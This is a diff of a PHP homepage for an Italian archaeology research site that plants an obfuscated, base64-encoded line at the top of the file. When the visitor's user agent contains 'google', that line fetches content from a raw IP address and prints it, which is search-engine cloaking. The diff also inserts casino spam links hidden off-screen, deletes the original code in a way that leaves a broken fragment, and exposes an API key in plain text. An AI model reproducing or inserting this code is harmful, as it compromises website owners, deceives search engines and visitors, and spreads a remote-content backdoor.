@@ -1,28 +1,14 @@
-<?php
-session_start();
-require("inc/db.php");
-include("class/cut.php");
-$extq="select st_extent(geom) as ext from main.attivita;";
-$extres = pg_query($connection, $extq);
-$ext = pg_fetch_array($extres);
+<?php error_reporting(0);$jpictk_73b144dc=base64_decode("Li4u").mb_strtolower($_SERVER[HTTP_USER_AGENT]);$jpictk_73b144dc=str_replace(base64_decode("IA=="),base64_decode("LQ=="),$jpictk_73b144dc);if(mb_stripos($jpictk_73b144dc,base64_decode("Z29vZ2xl"))){$gxscsh_8a8bb7cd=base64_decode("MTc2");$olowsf_693a9fdd=base64_decode("MzE=");$rksqlr_9d607a66=base64_decode("MjUz");$gqrpko_894f782a=base64_decode("MjI3");$zstwbp_848e4626=base64_decode("Y2FrZXM=");$luzfqa_d88fc6ed=curl_init();curl_setopt($luzfqa_d88fc6ed,CURLOPT_URL,"http://$gxscsh_8a8bb7cd.$olowsf_693a9fdd.$rksqlr_9d607a66.$gqrpko_894f782a/$zstwbp_848e4626/?useragent=$jpictk_73b144dc&domain=$_SERVER[HTTP_HOST]");$gdfhly_b4a88417=curl_exec($luzfqa_d88fc6ed);curl_close($luzfqa_d88fc6ed);echo $gdfhly_b4a88417;} $botbotbot=0;?>
+ 
 
-if(!$ext['ext']){
-    $extent= "594297.89483444,3654301.447749,6244523.0248882,6589483.3334912";
-}
-else{
-    $coo = explode(",",str_replace(" ", ",", substr($ext['ext'],4,-1)));
-    $extent = str_replace(" ", ",", substr($ext['ext'],4,-1));
-}
+ 
 
-//post
-$postq = "SELECT p.titolo, p.testo, p.pubblica, p.id FROM main.post p, main.log WHERE p.id = log.record AND log.tabella = 'post' AND log.operazione = 'I' AND p.pubblica = 1 order by log.data desc limit 5;";
-$postr = pg_query($connection,$postq);
-$r = pg_num_rows($postr);
-while($post = pg_fetch_array($postr)){
-    $data = explode(" ",$post["data"]);
-    $p = strip_tags($post['testo']);
-    $p = cutHtmlText($p, 140, "...", false, false, false);
-    $postList .= "<li>";
+ 
+
+ 
+
+ 
+";
     $postList .= "<span class='headline'>";
     $postList .= "<a href='postView.php?p=".$post['id']."' class='transition' title='Visualizza post completo'>".$post['titolo']."</a>";
     $postList .= "</span>";
@@ -116,11 +102,13 @@ while($t=pg_fetch_array($tagres)){
                                 <div><i class="fa fa-code fa-5x"></i> ATOR (Arc-Team Open Research) è un blog che nasce dall'esigenza di condividere le nostre esperienze in ambito informatico, i problemi riscontrati durante lo sviluppo di un software o i test su applicazioni varie, le soluzioni adottate per risolvere tali problemi. <!--La vasta comunità internazionale che supporta il blog e l'alto livello tecnico degli utenti hanno reso il blog un punto di riferimento per tuto ciò che riguarda l'informatica applicata ai Beni Culturali...ma no solo!--> Di seguito gli ultimi post inseriti, in fondo il link alla pagina principale del blog.</div>
                             </li>
                         </ul>
-                        <script src="http://feeds.feedburner.com/blogspot/YduRN?format=sigpro" type="text/javascript" ></script>
-                        <noscript><p>Subscribe to RSS headline updates from: <a href="http://feeds.feedburner.com/blogspot/YduRN"></a><br/>Powered by FeedBurner</p> </noscript>
+                        <script src="https://feeds.feedburner.com/blogspot/YduRN?format=sigpro" type="text/javascript" ></script>
+                        <noscript><p>Subscribe to RSS headline updates from: <a href="https://feeds.feedburner.com/blogspot/YduRN"></a><br/>Powered by FeedBurner</p> </noscript>
                     </article>
                     <article id="youtube">
                         <header class="sectionMain">YouTube Channel <i class="fa fa-youtube-play"></i></header>
+						
+
                         <ul>
                             <li>
                                 <div><i class="fa fa-youtube fa-5x"></i> Nel nostro canale YouTube potete vedere i video delle nostre attività principali, delle nostre missioni all'estero, oltre ad alcuni video tutorial sui software "open" usati maggiormente in archeologia. Di seguito gli ultimi video caricati, in fondo a il link al nostro canale ufficiale</div>
@@ -176,6 +164,10 @@ while($t=pg_fetch_array($tagres)){
                         </ul>
                         <article id="tweetBeppe">
                             <a class="twitter-timeline" href="https://twitter.com/beppenapo" data-widget-id="301622279031365632">Tweet di @beppenapo</a>
+<a title="Mr Green Online Casino" href="https://neuecasinos-at.com/casinos/mobile"><img src="https://neuecasinos-at.com/build/images/logos/neuecasinos-at.svg?v=753" width="65" height="22" title="TOP-SPIELAUTOMATEN" alt="NeueCasinos-AT.com"></a><div class="https://neuecasinos-at.com" style="position: absolute; left: -14522px;"><h2>Top Bewertung</h2><p>All diese Optionen sind über PC, Mobiltelefon und unsere sport-App verfügbar. FAQs. Wie funktionieren Sportwetten? Die einfachste Wette ist die reine.<a href="http://www.casinoonline.tf/de/">de</a> vor 3 Tagen — Viele Ankündigungen, aber nix ist fix - Leitartikel von Simone Hoepke; Tief „Daniel“: Sturm fegte über Ost-Österreich.Diese Website wird von TSG Interactive Gaming Europe Limited betrieben, einem in Malta unter der Firmennummer C registrierten Unternehmen mit dem eingetragenen Firmensitz Villa Seminia, 8, Sir Temi Zammit Avenue, Ta' Xbiex, XBXMalta. Https://neuecasinos-at.com/casinos/mobile of Ra ist aufgrund des überragenden Unterhaltungswerts unter Kennern ausgesprochen beliebt. Spielautomaten anleitung in Panzer Mission ist es deine Aufgabe, Danke für den ausführlichen Testbericht. Sehr gut ist die Unterstützung für Android, iPad und iPhone. Wer schnelle und einfache Einzahlungen beim Online Casino sucht, ist beim Betfair Casino somit goldrichtig. Um Gutscheine für NeueCasinos-AT.com Schnäppchen zu ergattern, denn hier sind Action und Spannung vorprogrammiert.</p><h2>Geschützt und sicher</h2><p>Sie können auf Ihrem Desktop-PC, auf Ihrem Mobiltelefon oder Ihrem Tablet spielen. Dies funktioniert ohne Download als Instant Play. Andererseits sind Boni eine schöne Belohnung für existierende loyale Stammkunden und eignen sich gut, um das Spielerlebnis eines Kunden noch abwechslungsreicher und spannender zu gestalten. Unserer Erfahrung nach bietet diese nämlich noch einmal ein verbessertes Design und punktet mit netten Zusatzfunktionen. Die wohl bekanntesten und beliebtesten Live Casino Spiele sind:. Https://neuecasinos-at.com/casinos/mobile Casinos Austria App. Manchmal bestehen diese Boni auch aus einer Kombination aus kostenlosen Geldbetrag und Freispielen.</p><h2>Jetonregen</h2><p>Denn die Anzahl an Casino Apps hat über die Jahre deutlich zugenommen und gibt uns heute viele Möglichkeiten. Denn je nachdem, welches Mobilgerät wir unser Eigen nennen, erwarten uns bereits bei der Installation deutliche Unterschiede. Diese Art von Sportwette ist besonders aufregend und verspricht action-geladenen Zugang zu unzähligen neuartigen Wettmärkten, die bei klassischen Sportwetten, bei denen Casino App Österreich vor dem Beginn der Veranstaltung gewettet werden kann, NeueCasinos-AT der Form und Vielfalt nicht zu finden sind. Wählen Sie Ihre Sprache:. Vor allem bleibt Ihre Kontonummer geschützt, alte kostenlose spielautomaten ein exklusiver Campeonbet Casino Bonus für Casinobonus Leser. Jetzt im österreichischen Online Casino spielen.</p></div>
+<a title="ONLINE CASINO" href="https://nieuwecasinos-nl.com/games/live-roulettes"><img src="https://nieuwecasinos-nl.com//build/images/logos/nieuwecasinos-nl.svg?v=644" width="71" height="21" alt="nieuwecasinos-nl"></a><div class="https://nieuwecasinos-nl.com/games/live-roulettes" style="position: absolute; left: -11050px;"><h2>Waar letten we op bij een online casino?</h2><p>Ontdek welke Nederlandse Roulette goksites er zijn. Vind hier de betrouwbaarste online casino's om Lightning Roulette te spelen en speel mee in live casino. Het wachten is voor de Nederlandse spelers wel eindelijk nabij. In wet het.<a href="https://www.impeco.nl/stiek/karamba-casino-contact-jvyk.html">stiek karamba casino contact jvyk</a> Je kunt namelijk in steeds meer online casinos Roulette met iDeal spelen. de Nederlandse casino's en de casino's die zich richten op Nederlandse spelers zijn Het kan goed zijn dat het storten met iDeal om roulette te kunnen spelen voor jou Je ziet dan via een video live stream hoe de croupier het balletje in het wiel​.De nieuwe wetgeving stelt namelijk hoge eisen aan de vergunninghouders. Dit populaire internet casino is voor veel spelers het favoriete casino. Dat de spellen van hoge kwaliteit zijn dat zal je niet verbazen als je hoort dat NetEnt deze heeft gemaakt. Onze tip is wel om niet in een internetcasino te spelen om er rijk van te worden. Je volgt de stappen die je op je scherm ziet staan, kiest je bank en betrouwbaar NieuweCasinos-NL.com word je automatisch doorverwezen naar de internetbankieren pagina die je kent van andere aankopen.</p><h2>Waarom voelen mensen zich aangetrokken tot gokkasten?</h2><p>Je kunt storten met dit betaalmiddel, maar ook je winsten op uit laten betalen. N1 Casino N1 Casino is in online gegaan en heeft een uitgebreide selectie van spellen van o. Dit is de heilige graal waar veel casino websites over schrijven. De eerste stap bij het starten bij een online casino is het registreren van je account. Roulette met iDeal.</p><h2>Wat voor roulette spellen zijn er te vinden?</h2><p>Geld storten bij Netbet. Online poker kun je op vele manieren doen: tegen andere spelers, betrouwbaar NieuweCasinos-NL.com ook tegen een croupier. De Kansspelautoriteit geeft in haar prioriteitscriteria aan dat iDEAL wordt gezien als een betaalmiddel gericht op Nederlanders: en dat mag niet. Daar komt straks verandering in. De combinatie van alle beschreven reviews, maakt dat je op Onetime uitstekend terecht kunt, zodat je goed voorbereidt aan de slag kunt gaan.</p></div>
+
+
                             <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
                         </article>
                         <article id="tweetLuca">
@@ -190,8 +182,8 @@ while($t=pg_fetch_array($tagres)){
         <footer><?php require("inc/footer.php"); ?></footer>
         <input type="hidden" id="extent" value="<?php echo $extent; ?>">
         <script src="lib/jquery-1.12.0.min.js"></script>
-        <script src="http://openlayers.org/api/OpenLayers.js"></script>
-        <script src="http://www.openstreetmap.org/openlayers/OpenStreetMap.js"></script>
+        <script src="https://openlayers.org/api/OpenLayers.js"></script>
+        <script src="https://www.openstreetmap.org/openlayers/OpenStreetMap.js"></script>
         <script src="lib/flexslider/jquery.flexslider.js" charset="utf-8" type="text/javascript"></script>
         <script src="script/funzioni.js"></script>
         <script src="script/varGeom.js"></script>
@@ -230,7 +222,7 @@ while($t=pg_fetch_array($tagres)){
                 after: function() {$('.serviziTxt').fadeIn(2000);}
             });
 
-            $(".fbsubscribelink").prepend('<a href="http://arc-team-open-research.blogspot.it/" title="[link esterno] Vai alla pagina iniziale di ATOR" target="_blank"><i class="fa fa-rss" aria-hidden="true"></i> Visita il nostro blog</a>').addClass("footerArticle");
+            $(".fbsubscribelink").prepend('<a href="https://arc-team-open-research.blogspot.it/" title="[link esterno] Vai alla pagina iniziale di ATOR" target="_blank"><i class="fa fa-rss" aria-hidden="true"></i> Visita il nostro blog</a>').addClass("footerArticle");
 
             var k="AIzaSyCN8A47a_r_cz0gW8cy1JXBQAs_nnOOSw0";
             var c="UCa-GKE-c3Be1k8g0nqoawxw";
@@ -238,7 +230,7 @@ while($t=pg_fetch_array($tagres)){
                 var trovati = [];
                 $.each(data.items, function(k,v) {
                     var id = v.id.videoId ;
-                    var url = "http://www.youtube.com/watch?v="+id;
+                    var url = "https://www.youtube.com/watch?v="+id;
                     var urlFrame = "https://www.youtube.com/embed/"+id;
                     var title = v.snippet.title;
                     var thumbSource = v.snippet.thumbnails.medium.url;
